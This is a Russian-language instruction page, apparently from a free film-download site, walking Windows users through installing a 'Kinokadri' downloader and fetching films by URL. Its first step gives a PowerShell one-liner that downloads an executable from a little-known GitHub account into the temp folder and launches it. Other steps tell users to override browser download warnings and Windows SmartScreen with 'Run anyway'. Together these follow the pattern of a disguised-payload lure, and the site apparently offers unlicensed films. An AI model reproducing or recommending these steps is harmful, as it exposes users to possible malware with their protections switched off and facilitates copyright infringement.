Как скачать фильм

Установите программу один раз — после этого любой фильм скачивается в три действия.

  1. 1Скачайте и установите программу
  2. 2Скопируйте ссылку на фильм с сайта
  3. 3Вставьте ссылку в программу
  4. 4Выберите качество и скачайте
1

Скачайте и установите программу

Программа лежит на GitHub. Выберите один из двух способов — результат одинаковый.

Способ 1. Установка одной командой (PowerShell)

Самый простой способ: Windows сама скачает программу с GitHub и установит её.

  1. Щёлкните правой кнопкой мыши по значку Windows внизу экрана и выберите Терминал (Terminal; в Windows 10 он называется Windows PowerShell).
    SystemDevice Manager2TerminalTerminal (Admin)Task ManagerSettings
    1

    1 правая кнопка по значку Windows  →  2 Terminal

  2. Скопируйте эту команду кнопкой «Копировать». 
    curl.exe -L -o "$env:TEMP\KinokadriSetup.exe" "https://github.com/repackfile/kinokadri-app/releases/latest/download/KinokadriSetup.exe"; if ($?) { Start-Process "$env:TEMP\KinokadriSetup.exe" }
  3. В открывшемся окне нажмите правую кнопку мыши (команда вставится), затем клавишу Enter. Программа скачается, и установка начнётся сама.

Команда делает две вещи: скачивает KinokadriSetup.exe с GitHub во временную папку и запускает его. Права администратора не нужны.

Способ 2. Скачать с GitHub

  1. Нажмите кнопку «Скачать». Откроется страница программы на GitHub.
  2. В нижней части этой страницы найдите раздел Assets и нажмите на файл KinokadriSetup.exe. Файлы «Source code» не нужны.
  3. Если браузер остановил загрузку и пишет, что файл скачивают редко, откройте список загрузок браузера и выберите Keep («Сохранить»).
  4. Откройте скачанный файл двойным щелчком. Программа установится и откроется сама.

Программа новая, поэтому Windows может показать синее окно «Windows protected your PC» («Система Windows защитила ваш компьютер»). В этом случае нажмите More info («Подробнее»), затем Run anyway («Выполнить в любом случае»). Убедитесь, что файл скачан с этой страницы GitHub, а не с другого сайта.

На некоторых компьютерах при установке появится надпись «Устанавливается Microsoft WebView2». Это компонент Microsoft, он ставится один раз и занимает несколько минут. Не закрывайте окно.

2

Прочитайте правила и согласитесь

При первом запуске программа покажет, что она делает на вашем компьютере. Прочитайте, отметьте «Я прочитал(а) правила и согласен(на) с ними» и нажмите «Согласиться и продолжить».

Этот экран показывается только один раз.

3

Скопируйте ссылку на фильм с сайта

  1. Откройте kinokadri.co и перейдите на страницу фильма, который хотите скачать.
  2. Щёлкните по верхней строке браузера, где написан адрес сайта. Адрес выделится (станет синим).
  3. Нажмите на клавиатуре Ctrl + C. Ссылка скопирована.
https://kinokadri.co/movie/project-wolf-hunting/
↑ Это ссылка на фильм. Выделите её и нажмите Ctrl + C

Ссылка всегда начинается так: kinokadri.co/movie/…

4

Вставьте ссылку в программу

  1. Вернитесь в программу Kinokadri, на страницу «Загрузки».
  2. Нажмите кнопку «Вставить». Ссылка сама появится в поле, и фильм откроется.

Если так удобнее: щёлкните по полю, нажмите Ctrl + V, затем кнопку «Открыть».

5

Выберите качество и озвучку

  1. Качество: чем больше число, тем лучше картинка и больше файл. Рядом указан примерный размер.
  2. Озвучка: выберите язык. Можно отметить несколько и переключать их в плеере при просмотре.
  3. Нажмите «Скачать».

Файлы 1080P и 4K меньше, чем можно ожидать, потому что сделаны современным кодированием. Качество от этого не страдает. Подробности — по нажатию на жёлтый значок «!».

6

Подождите и смотрите

Фильм появится в списке с полосой прогресса. Программу можно закрыть: она остаётся значком возле часов и продолжает скачивать.

  • Когда появится надпись «Готово», нажмите значок ▷ — фильм откроется.
  • Значок папки покажет, где лежит файл (обычно Videos → Kinokadri).
  • Все скачанные фильмы видны на странице «Библиотека».

Для следующего фильма повторите шаги 3–5. Устанавливать программу заново не нужно.

Частые вопросы

Программа платная?

Нет, программа и скачивание фильмов бесплатны.

Вставил(а) ссылку, а программа пишет, что фильм не найден

Ссылка должна быть адресом страницы фильма и начинаться так: kinokadri.co/movie/… Ссылка на главную страницу, поиск или сериал не подойдёт. Откройте страницу самого фильма и скопируйте адрес оттуда.

Скачанный фильм не открывается или нет звука

На некоторых компьютерах стандартный плеер Windows не открывает файлы 1080P и 4K. Установите бесплатный плеер VLC (videolan.org) и откройте фильм в нём. Или скачайте качество 720P — оно открывается везде.

Можно остановить загрузку и продолжить позже?

Да. Нажмите в списке значок паузы, а чтобы продолжить — значок ▷. Загрузка продолжится с того места, где остановилась, даже после выключения компьютера.

Как удалить программу?

Откройте в параметрах Windows раздел «Приложения» (Apps), найдите Kinokadri и нажмите «Удалить». Скачанные фильмы не удалятся.

Работает на телефоне или Mac?

Пока программа работает только на Windows 10 и 11.
